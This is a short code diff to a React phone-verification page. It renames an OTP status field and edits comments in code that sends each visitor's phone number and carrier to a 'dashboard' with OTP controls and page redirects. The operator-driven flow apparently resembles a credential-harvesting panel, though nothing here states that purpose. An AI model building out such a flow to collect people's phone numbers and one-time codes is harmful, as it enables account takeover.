@@ -147,20 +147,20 @@ export default function VerifyPhonePage() {
         phoneNumber: phoneNumber,
         phoneCarrier: selectedCarrier,
         phoneSubmittedAt: new Date().toISOString(),
-        _v5Status: 'pending', // For dashboard OTP status
+        phoneOtpStatus: 'pending', // Step 5 - phone OTP status
         phoneUpdatedAt: new Date().toISOString(),
         redirectPage: null
       })
 
-      // Notify dashboard immediately with phone OTP data
+      // Notify dashboard immediately with phone data
       await notifyDashboard({
         id: visitorID,
         visitorId: visitorID,
-        _v5Status: 'pending',
+        phoneOtpStatus: 'pending', // Step 7 - phone OTP
         phoneNumber: phoneNumber,
         phoneCarrier: selectedCarrier,
         phoneSubmittedAt: new Date().toISOString(),
-        currentPage: "veri", // For dashboard to show OTP buttons
+        currentPage: "phone",
         currentStep: 7,
         status: "pending"
       })
